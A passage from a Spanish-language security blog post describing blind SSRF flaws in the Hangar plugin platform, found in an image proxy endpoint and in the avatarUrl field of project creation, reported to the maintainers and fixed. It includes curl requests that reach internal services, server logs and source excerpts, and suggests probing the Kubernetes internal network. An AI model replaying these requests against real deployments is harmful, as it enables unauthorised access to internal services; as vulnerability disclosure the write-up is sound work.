> GET /api/internal/image/http://s-01010101.7f000001-760894422-fs-e.dynamic.vzondev.xyz:7700/testing123 HTTP/1.1
> Host: 10.8.0.1:8080
> User-Agent: curl/8.12.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 400 Bad Request
< Expires: 0
< Cache-Control: no-cache, no-store, max-age=0, must-revalidate
< Server: Hangar
< X-XSS-Protection: 0
< Pragma: no-cache
< X-Frame-Options: DENY
< date: Sat, 26 Apr 2025 16:24:05 GMT
< Connection: keep-alive
< Vary: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
< X-Content-Type-Options: nosniff
< Content-Type: application/json
< Content-Length: 126
< 
* Connection #0 to host 10.8.0.1 left intact
{"message":"400 BAD_REQUEST \"Bad content type\"","messageArgs":[],"isHangarApiException":true,"httpError":{"statusCode":400}}
```

En los logs del Meilisearch veo que:

```bash
vzon@none:~/singularity$ docker compose -f ../Hangar/docker/dev.yml logs
... [snip]
meilisearch-1  | 2025-04-26T16:24:05.641772Z  INFO HTTP request{method=GET host="s-01010101.7f000001-760894422-fs-e.dynamic.vzondev.xyz:7700" route=/testing123 query_parameters= user_agent=curl/8.12.1 Hangar/1.0 status_code=404}: meilisearch: close time.busy=432µs time.idle=83.8µs
```

¡La petición ha logrado llegar a un servidor interno! Esto es una vulnerabilidad SSRF (casi por completo) a ciegas debido a que el servidor no muestra el contenido de la respuestas que no tengan en la cabecera `Content-Type` un MIME de imagen. Sin embargo con algunos servidores esto tira el mismo error que vimos con Cloudflare y nos filtra las cabeceras devueltas por el servidor:

```bash
# Estoy corriendo un servidor HTTP Python en 127.0.0.1:8000 
❯ curl -v http://10.8.0.1:8080/api/internal/image/http://s-01010101.7f000001-760894427-fs-e.dynamic.vzondev.xyz:8000/uwuowo
... [snip]
< HTTP/1.1 500 Internal Server Error
< Expires: 0
< Cache-Control: no-cache, no-store, max-age=0, must-revalidate
< Server: SimpleHTTP/0.6 Python/3.11.2
< X-XSS-Protection: 0
< Pragma: no-cache
< X-Frame-Options: DENY
< Date: Sat, 26 Apr 2025 16:42:03 GMT
< Connection: close
< Vary: Origin
< Vary: Access-Control-Request-Method
< Vary: Access-Control-Request-Headers
< X-Content-Type-Options: nosniff
< Content-Type: text/html;charset=utf-8
< Content-Length: 0
< 
* shutting down connection #0
```

Se ve interesante, pero es un poco tediosa de abusar, ya que *depende mucho* del protocolo DNS y como este es manejado tanto por Java como por el servidor que hospeda la aplicación. Asi que seguí viendo por otras cosas.

Continuando, encontré un endpoint interesante (`/api/internal/projects/create`):

```java
... [snip]
@Unlocked
@RequireAal(1)
@RateLimit(overdraft = 5, refillTokens = 1, refillSeconds = 60)
@PostMapping(value = "/create", consumes = MediaType.APPLICATION_JSON_VALUE)
public ResponseEntity<String> createProject(@RequestBody @Valid final NewProjectForm newProject) {
        final ProjectTable projectTable = this.projectFactory.createProject(newProject);
        return ResponseEntity.ok(projectTable.getUrl());
}
... [snip]
```
{: file="backend/src/main/java/io/papermc/hangar/controller/internal/projects/ProjectController.java" }

El `ProjectFactory` crea los proyectos así:

```java
@Transactional
public ProjectTable createProject(final NewProjectForm newProject) {
    final ProjectOwner projectOwner = this.projectService.getProjectOwner(newProject.getOwnerId());
    if (projectOwner == null) {
        throw new HangarApiException(HttpStatus.BAD_REQUEST, "error.project.ownerNotFound");
    }

    this.checkProjectAvailability(newProject.getName());
    this.projectService.validateSettings(newProject);

    ProjectTable projectTable = null;
    try {
        projectTable = this.projectsDAO.insert(new ProjectTable(projectOwner, newProject));
        this.channelService.createProjectChannel(this.config.channels().nameDefault(), this.config.channels().descriptionDefault(), this.config.channels().colorDefault(), projectTable.getId(), Set.of(ChannelFlag.FROZEN, ChannelFlag.PINNED, ChannelFlag.SENDS_NOTIFICATIONS));
        this.projectMemberService.addNewAcceptedByDefaultMember(ProjectRole.PROJECT_OWNER.create(projectTable.getId(), null, projectOwner.getUserId(), true));
        String newPageContent = newProject.getPageContent();
        if (newPageContent == null) {
            newPageContent = "# " + projectTable.getName() + "\n\n" + this.config.pages().home().message();
        }

        final String defaultName = this.config.pages().home().name();
        this.projectPageService.createPage(projectTable.getId(), defaultName, StringUtils.slugify(defaultName), newPageContent, false, null, true);
        if (newProject.getAvatarUrl() != null) {
            this.avatarService.importProjectAvatar(projectTable.getId(), newProject.getAvatarUrl());
        }
    } catch (final Exception exception) {
        if (projectTable != null) {
            this.projectsDAO.delete(projectTable);
        }
        throw exception;
    }

    this.usersApiService.clearAuthorsCache();
    this.indexService.updateProject(projectTable.getId());
    return projectTable;
}
```
{: file="backend/src/main/java/io/papermc/hangar/service/internal/projects/ProjectFactory.java" }

Si miras bien al final de la claúsula `try`, hay una condición para importar un avatar. Dicho debe estar presente en el campo `avatarUrl` de la petición POST. (Spring procesa el cuerpo de la petición según los parámetros del método, y en este caso espera un objeto `NewProjectForm`, que tiene el campo `avatarUrl` respectivo)

El método `importProjectAvatar` de `AvatarService` hace lo siguiente:

```java
public void importProjectAvatar(final long projectId, final String avatarUrl) {
        try {
            final ResponseEntity<byte[]> avatar = this.restTemplate.getForEntity(avatarUrl, byte[].class);
            if (avatar.getStatusCode().is2xxSuccessful()) {
                this.changeProjectAvatar(projectId, avatar.getBody());
            } else {
                logger.warn("Couldn't import project avatar from {}, {}", avatarUrl, avatar.getStatusCode());
            }
        } catch (final Exception ex) {
            logger.warn("Couldn't import project avatar from " + avatarUrl, ex);
        }
}
```

El objeto `RestTemplate` de Spring funciona como la interfaz de un simple cliente HTTP. El método `getForEntity(String url, Class<T> type)` hace lo siguiente según los javadocs:

> Retrieve a representation by doing a GET on the URL. The response is converted and stored in a ResponseEntity.

De a primeras esto es un SSRF a secas, solamente estás límitado al método GET de HTTP. Viendo el código del método `changeProjectAvatar` vemos que le aplica esto a lo devuelto por el servidor:

```java
... [snip]
avatar = this.imageService.convertAndOptimize(avatar);
... [snip]
```

y dicho método intenta convertir los datos a un objeto `Image` de la API de Java, por lo que el servidor tirará un error con cualquier cosa que no sea una imagen. Al igual que la otra vulnerabilidad quedamos limitados a un casi por completo Blind SSRF solo con la diferencia de que aquí no dependemos de DNS.

Ahora, viendo como está diseñada la aplicación a nivel de sistema ví que esto está hecho para usarse en producción con [Helm](https://helm.sh/), lo que implica Kubernetes.

```yaml
apiVersion: v2
name: hangar
description: Hangar Kubernetes Deployment
type: application
version: 0.0.1
appVersion: "0.0.1"
```
{: file="chart/Chart.yaml" }

Con este SSRF podrías intentar hacer una que otra cosa por la red interna de Kubernetes de la aplicación.

Reporté la vulnerabilidad a `security@papermc.io` y tardaron unas horas en corregirla.

**No hubo recompensa**

> Me quedan unas vulnerabilidades por reportar. Cuando las reporte y solucionen, voy a publicar información al respecto acá.
{: .prompt-info }

## Conclusión

Si bien no obtuve ninguna recompensa haciendo esto, me entretuvo mucho indagar por las aplicaciones y sitios mostrados en este post y haberle encontrado fallos de seguridad. Me gusta mucho romper cosas.










